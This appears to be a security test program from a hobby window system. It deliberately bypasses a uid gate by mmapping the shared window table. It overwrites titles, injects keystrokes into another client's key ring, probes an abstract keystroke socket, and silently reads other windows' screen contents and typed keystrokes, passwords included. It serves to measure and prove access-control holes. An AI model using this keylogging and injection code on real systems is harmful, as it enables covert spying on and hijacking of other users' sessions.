/* tests/linux/wsys_bypass.c — the program the uid gate cannot bind.
 *
 * WHAT THIS IS FOR.  user/linux-wsys.c's uid gate is a check inside a library:
 * it binds every caller of the /dev/wsys FILE PROTOCOL, which is every program
 * in this tree, and nothing else.  This program is deliberately not one of
 * those callers.  It does not open /dev/wsys, it does not know the protocol,
 * it does not link the syscall runtime.  It does what a hostile or merely
 * buggy program does: open the backing file, mmap it MAP_SHARED, and write.
 *
 * That is why it is C and not Adder.  An Adder program would reach /dev/wsys
 * through the devtab and be gated on the way in, which is the thing not under
 * test.  Everything here is a raw libc call and every line it prints ends in a
 * number the kernel returned.
 *
 *   wsys_bypass <tag> <path> <needle> <replacement>
 *
 * It reports, for <path>:
 *   mode=      the file mode, octal            \  the two facts the whole
 *   uid=       the owning uid                  /  split rests on
 *   open_rdwr= the fd, or -errno               -- can a non-owner open it W?
 *   mmap_rw=   0, or -errno                    -- can a non-owner MAP it W?
 *   open_ro=   the fd, or -errno               -- can it still READ it?
 *   mmap_ro=   0, or -errno
 *   found=     1 if <needle> is in the mapping -- did we see the real table?
 *   wrote=     1 if <replacement> was written over it
 *
 * <needle>/<replacement> are the same length by construction (the caller is
 * asserted on it), so a successful write is an in-place overwrite of live
 * shared state and nothing moves.
 *
 * The POSITIVE CONTROL matters as much as the refusal.  Run against the 0666
 * window table this program succeeds -- found=1 wrote=1 -- which is the
 * residual hole, stated as a measurement rather than a caveat, and which
 * proves the technique works.  Run against the 0644 chrome segment the
 * IDENTICAL code is refused by the kernel.  One test, one program, two files,
 * and the only difference between the two runs is the file mode.
 *
 * A SECOND MODE, `injkey`, measures the third attack the split leaves open:
 * injecting into another client's key ring.  Retitling and scene-scribbling
 * are in-place byte overwrites the generic mode above already does; a ring is
 * different, because a reader only sees bytes between its r and w counters, so
 * an injection has to WRITE the event AND advance w.  That needs the window
 * table's layout, which a hostile program simply reads out of this open-source
 * header -- so this mode mirrors struct wwin (below) exactly, finds the victim
 * row by its title with the same memmem the generic mode uses, and pokes a key
 * line into that row's `keys` ring.  It prints the wid and pid it read back
 * out of the row it landed on, so a layout drift shows up as a mismatch the
 * harness asserts on rather than as a silent write into the wrong place.
 *
 *   wsys_bypass injkey <path> <victim-title> <keyline>
 *
 * The mirror MUST track user/linux-wsys.c's struct wwin / struct wring /
 * WSYS_RING_CAP byte-for-byte; if it stops, the injected bytes land at the
 * wrong offset, the protocol read of /dev/wsys/<wid>/keys comes back without
 * them, and tests/linux/wsys_bypass.sh's assertion fails loudly.
 *
 * A THIRD MODE, `snoop`, measures the half of the hole the other two do not
 * touch and that no file mode can close.  The three attacks above are all
 * INTEGRITY: they need PROT_WRITE, and the 0644 chrome segment shows what
 * happens to them when the kernel refuses it.  This one is CONFIDENTIALITY,
 * and it opens the file O_RDONLY and maps it PROT_READ ONLY -- deliberately,
 * because that is the whole finding:
 *
 *     the window table has to be world-READABLE for the desktop to work.
 *
 * The panel taskbar parses every window's title out of /dev/wsys/windows; a
 * uid-1001 client reads the screen geometry the root compositor published.  So
 * even the strictest fix that keeps ONE table -- make /srv/wsys 0644 and put
 * every write behind an authenticated RPC -- closes all three integrity attacks
 * and NOT ONE of these:
 *
 *   KEYLOG      read the bytes between another window's `keys` ring r and w.
 *               Those are that window's keystrokes: its password, as typed.
 *   SCRAPE      read another window's committed `scene`, which is what is on
 *               the screen inside it.
 *   ENUMERATE   read every row's wid, pid, geometry and title.
 *
 * That is why THE SPLIT's "all of it or none" is not rhetoric: the only thing
 * that closes these is per-window memory a non-owner cannot map at all, handed
 * out by the authority at window creation -- not a mode, not a gate, not an RPC
 * in front of a shared table.
 *
 *   wsys_bypass snoop <path> <wid=N|title-run> [tag]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <unistd.h>

/* ---- the mirror, tracking user/linux-wsys.c exactly --------------------- */
#define WSYS_RING_CAP     8192
#define WSYS_SCENE_CAP    16384
#define WSYS_TITLE_CAP    64
#define WSYS_MAX_WINDOWS  256

struct m_wring {
    uint32_t r, w;
    uint8_t  b[WSYS_RING_CAP];
};

struct m_wwin {
    uint32_t used;
    int32_t  wid;
    int32_t  pid;
    int32_t  x, y, w, h, z;
    int32_t  decorate, visible, proto;
    int32_t  pinned;
    int32_t  wmdelete;
    int32_t  keyed, blend;
    uint32_t scene_len;
    uint32_t scene_gen;
    uint32_t stage_len;
    char     title[WSYS_TITLE_CAP];
    uint8_t  scene[WSYS_SCENE_CAP];
    uint8_t  stage[WSYS_SCENE_CAP];
    struct m_wring keys, pointer, event, text, cmd;
};

/* Enough of struct wshm to index win[] -- the header before it, then the
 * array.  The sink[] table after win[] is not mirrored: nothing here indexes
 * past win[]. */
struct m_wshm {
    uint32_t magic, version;
    int32_t  focus_wid, next_wid, desktop;
    uint32_t gen, inputgen;
    struct m_wwin win[WSYS_MAX_WINDOWS];
};

/* injkey <path> <victim> <keyline>: find a window row, then write
 * "<keyline>\n" into its `keys` ring and advance the ring's w.  <victim> is
 * either a title byte run (found with the same memmem the generic overwrite
 * uses) or "wid=<n>" (walk win[] for that wid) -- a hostile program reading
 * this open-source header can do either, and the wid form is what the caller
 * needs when a title is shared by a reaped row.  Prints found=/wid=/pid=/wrote=
 * so the caller can confirm the injection landed on the row it meant to.  Same
 * MAP_SHARED write path as the generic mode, so the 0666 mode is the whole
 * reason it works. */
static int inject_key(const char *tag, const char *path,
                      const char *victim, const char *keyline)
{
    printf("== %s", tag);

    struct stat st;
    if (stat(path, &st) != 0) { printf(" stat=-%d\n", errno); return 0; }
    printf(" mode=0%o uid=%d", (unsigned)(st.st_mode & 07777), (int)st.st_uid);

    int fd = open(path, O_RDWR);
    printf(" open_rdwr=%d", fd >= 0 ? fd : -errno);
    if (fd < 0) { printf(" found=0 wrote=0\n"); return 0; }

    size_t len = (size_t)st.st_size;
    void  *m   = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    printf(" mmap_rw=%s", m == MAP_FAILED ? "FAIL" : "0");
    if (m == MAP_FAILED) { printf(" found=0 wrote=0\n"); close(fd); return 0; }

    struct m_wwin *v = NULL;
    if (strncmp(victim, "wid=", 4) == 0) {
        /* Walk the window array for the target wid, exactly as a program that
         * had read struct wshm would. */
        int want = atoi(victim + 4);
        struct m_wshm *s = (struct m_wshm *)m;
        for (int i = 0; i < WSYS_MAX_WINDOWS; i++) {
            if (s->win[i].used && s->win[i].wid == want) { v = &s->win[i]; break; }
        }
    } else {
        /* The title is a plain byte run in the row, so finding it IS finding
         * the row: back up from the title field to the head of struct wwin. */
        void *hit = memmem(m, len, victim, strlen(victim));
        if (hit)
            v = (struct m_wwin *)((uint8_t *)hit - offsetof(struct m_wwin, title));
    }

    int found = v != NULL, wrote = 0;
    printf(" found=%d", found);
    if (found) {
        printf(" wid=%d pid=%d", v->wid, v->pid);
        struct m_wring *q = &v->keys;
        size_t n = strlen(keyline);
        for (size_t i = 0; i < n; i++)
            q->b[q->w++ % WSYS_RING_CAP] = (uint8_t)keyline[i];
        q->b[q->w++ % WSYS_RING_CAP] = '\n';    /* the ring is line-framed */
        msync(m, len, MS_SYNC);
        wrote = 1;
    }
    printf(" wrote=%d\n", wrote);
    munmap(m, len);
    close(fd);
    return 0;
}

/* keysend <path> <wid> <line> [tag]: the attack the KEYSTROKE CHANNEL invites.
 *
 * The keys ring left the segment, so a bypasser can no longer read or write it
 * -- but the channel that replaced it is an ABSTRACT AF_UNIX address, abstract
 * sockets carry no file mode, and its name is derived from public facts (the
 * segment's st_dev/st_ino and the wid).  So anybody can compute it and anybody
 * can sendto() it.  This mode is that program, and it exists so the gate can
 * prove the check is the KERNEL's SCM_CREDENTIALS stamp on the datagram and not
 * the obscurity of the address:
 *
 *   run as the HOST OWNER  the victim receives the line   (the positive control
 *                          that the address is right and the channel is real)
 *   run as any other uid   the victim receives nothing    (the boundary)
 *
 * It links no runtime and knows no protocol, exactly like the modes above. */
static int keysend(const char *tag, const char *path, const char *widarg,
                   const char *line)
{
    printf("== %s", tag);

    struct stat st;
    if (stat(path, &st) != 0) { printf(" stat=-%d\n", errno); return 0; }

    struct sockaddr_un a;
    memset(&a, 0, sizeof a);
    a.sun_family = AF_UNIX;
    a.sun_path[0] = '\0';
    int n = snprintf(a.sun_path + 1, sizeof a.sun_path - 1,
                     "hamnix-wsys/%llu.%llu/%d/keys",
                     (unsigned long long)st.st_dev,
                     (unsigned long long)st.st_ino, atoi(widarg));
    printf(" uid=%d addr=[%s]", (int)getuid(), a.sun_path + 1);
    socklen_t alen = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + n);

    int s = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (s < 0) { printf(" socket=-%d sent=0\n", errno); return 0; }

    char buf[256];
    int ln = snprintf(buf, sizeof buf, "%s\n", line);
    ssize_t w = sendto(s, buf, (size_t)ln, 0, (struct sockaddr *)&a, alen);
    printf(" sendto=%zd", w);
    if (w < 0) printf(" errno=%d", errno);
    printf(" sent=%d\n", w > 0 ? 1 : 0);
    close(s);
    return 0;
}

/* Print a byte run with the framing characters made visible, so a ring's
 * contents survive being read out of a shell variable by the harness. */
static void put_run(const uint8_t *b, size_t n)
{
    for (size_t i = 0; i < n && i < 256; i++) {
        unsigned c = b[i];
        if (c == '\n')                    fputs("\\n", stdout);
        else if (c >= 0x20 && c < 0x7f)   putchar((int)c);
        else                              printf("\\x%02x", c);
    }
}

/* snoop <path> <victim> [tag]: READ another window's row.  O_RDONLY and
 * PROT_READ throughout -- if this ever needs write access the finding is
 * wrong, so `ro=1` is printed as an assertion the harness checks rather than
 * as a description.  Prints the victim's identity, its committed scene and the
 * unread bytes of its `keys` ring, which are its keystrokes. */
static int snoop(const char *tag, const char *path, const char *victim)
{
    printf("== %s", tag);

    struct stat st;
    if (stat(path, &st) != 0) { printf(" stat=-%d\n", errno); return 0; }
    printf(" mode=0%o uid=%d", (unsigned)(st.st_mode & 07777), (int)st.st_uid);

    int fd = open(path, O_RDONLY);
    printf(" open_ro=%d", fd >= 0 ? fd : -errno);
    if (fd < 0) { printf(" ro=1 found=0\n"); return 0; }

    size_t len = (size_t)st.st_size;
    void  *m   = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, 0);
    printf(" mmap_ro=%s", m == MAP_FAILED ? "FAIL" : "0");
    if (m == MAP_FAILED) { printf(" ro=1 found=0\n"); close(fd); return 0; }

    const struct m_wwin *v = NULL;
    if (strncmp(victim, "wid=", 4) == 0) {
        int want = atoi(victim + 4);
        const struct m_wshm *s = (const struct m_wshm *)m;
        for (int i = 0; i < WSYS_MAX_WINDOWS; i++)
            if (s->win[i].used && s->win[i].wid == want) { v = &s->win[i]; break; }
    } else {
        void *hit = memmem(m, len, victim, strlen(victim));
        if (hit)
            v = (const struct m_wwin *)((const uint8_t *)hit
                                        - offsetof(struct m_wwin, title));
    }

    printf(" ro=1 found=%d", v != NULL);
    if (v) {
        printf(" wid=%d pid=%d geom=%d,%d,%d,%d title=[%.*s]",
               v->wid, v->pid, v->x, v->y, v->w, v->h,
               WSYS_TITLE_CAP, v->title);
        uint32_t sl = v->scene_len;
        if (sl > WSYS_SCENE_CAP) sl = WSYS_SCENE_CAP;
        printf(" scenelen=%u scene=[", sl);
        put_run(v->scene, sl);
        fputs("]", stdout);
        /* THE KEYSTROKES.  A ring reader sees exactly the bytes between r and
         * w; this reads the same window without disturbing either counter, so
         * the victim still receives everything it was sent and has no way to
         * notice.  A keylogger that consumed the events would be a bug report;
         * this one is silent. */
        const struct m_wring *q = &v->keys;
        uint32_t have = q->w - q->r;
        if (have > WSYS_RING_CAP) have = WSYS_RING_CAP;
        printf(" keyn=%u keys=[", have);
        for (uint32_t i = 0; i < have && i < 256; i++) {
            uint8_t c = q->b[(q->r + i) % WSYS_RING_CAP];
            put_run(&c, 1);
        }
        fputs("]", stdout);
    }
    putchar('\n');
    munmap(m, len);
    close(fd);
    return 0;
}

int main(int argc, char **argv)
{
    /* snoop <path> <victim> [tag] */
    if (argc >= 4 && strcmp(argv[1], "snoop") == 0)
        return snoop(argc >= 5 ? argv[4] : "snoop.table", argv[2], argv[3]);

    /* keysend <path> <wid> <line> [tag] */
    if (argc >= 5 && strcmp(argv[1], "keysend") == 0)
        return keysend(argc >= 6 ? argv[5] : "keysend", argv[2], argv[3],
                       argv[4]);

    /* injkey <path> <victim-title> <keyline> [tag] */
    if (argc >= 5 && strcmp(argv[1], "injkey") == 0)
        return inject_key(argc >= 6 ? argv[5] : "injkey.table",
                          argv[2], argv[3], argv[4]);

    if (argc < 5) {
        fprintf(stderr, "usage: wsys_bypass <tag> <path> <needle> <repl>\n");
        return 2;
    }
    const char *tag = argv[1], *path = argv[2];
    const char *needle = argv[3], *repl = argv[4];
    if (strlen(needle) != strlen(repl)) {
        fprintf(stderr, "wsys_bypass: needle and repl must be the same length\n");
        return 2;
    }

    printf("== %s", tag);

    struct stat st;
    if (stat(path, &st) == 0)
        printf(" mode=0%o uid=%d size=%lld", (unsigned)(st.st_mode & 07777),
               (int)st.st_uid, (long long)st.st_size);
    else
        printf(" mode=- uid=- size=- stat=-%d", errno);

    /* 1. The write path a bypasser wants. */
    int rw = open(path, O_RDWR);
    printf(" open_rdwr=%d", rw >= 0 ? rw : -errno);

    void *m = MAP_FAILED;
    int   maplen = 0;
    if (rw >= 0) {
        maplen = (int)(st.st_size > 0 ? st.st_size : 0);
        m = mmap(NULL, maplen ? (size_t)maplen : 4096,
                 PROT_READ | PROT_WRITE, MAP_SHARED, rw, 0);
        printf(" mmap_rw=%s", m == MAP_FAILED ? "FAIL" : "0");
        if (m == MAP_FAILED) printf("(-%d)", errno);
    } else {
        printf(" mmap_rw=skip");
    }

    /* 2. If the kernel refused that, try the read-only route -- BOTH because
     *    a bypasser would, and because the DE depends on it: a uid-1001 client
     *    must still be able to READ the chrome it renders.  A refusal here
     *    would mean the split had blinded the session, which is the failure
     *    mode the 0666 mode on the window table exists to prevent. */
    int ro = -1;
    if (m == MAP_FAILED) {
        ro = open(path, O_RDONLY);
        printf(" open_ro=%d", ro >= 0 ? ro : -errno);
        if (ro >= 0) {
            if (st.st_size <= 0) st.st_size = 4096;
            maplen = (int)st.st_size;
            m = mmap(NULL, (size_t)maplen, PROT_READ, MAP_SHARED, ro, 0);
            printf(" mmap_ro=%s", m == MAP_FAILED ? "FAIL" : "0");
            if (m == MAP_FAILED) printf("(-%d)", errno);
            /* A read-only mapping cannot be written, and saying so is the
             * point: mprotect(PROT_WRITE) on a MAP_SHARED mapping of an
             * O_RDONLY fd is refused too, so there is no second door. */
            if (m != MAP_FAILED) {
                int mp = mprotect(m, (size_t)maplen, PROT_READ | PROT_WRITE);
                printf(" mprotect_w=%s", mp == 0 ? "0" : "FAIL");
            }
        } else {
            printf(" mmap_ro=skip");
        }
    } else {
        printf(" open_ro=skip mmap_ro=skip");
    }

    int found = 0, wrote = 0;
    if (m != MAP_FAILED && maplen > 0) {
        void *hit = memmem(m, (size_t)maplen, needle, strlen(needle));
        found = hit != NULL;
        if (hit && rw >= 0) {
            /* The overwrite.  If this returns, the bypass worked: the bytes
             * are in a MAP_SHARED page and every other process in the window
             * system now reads the new value. */
            memcpy(hit, repl, strlen(repl));
            msync(m, (size_t)maplen, MS_SYNC);
            wrote = 1;
        }
    }
    printf(" found=%d wrote=%d\n", found, wrote);
    if (m != MAP_FAILED) munmap(m, (size_t)maplen);
    if (rw >= 0) close(rw);
    if (ro >= 0) close(ro);
    return 0;
}
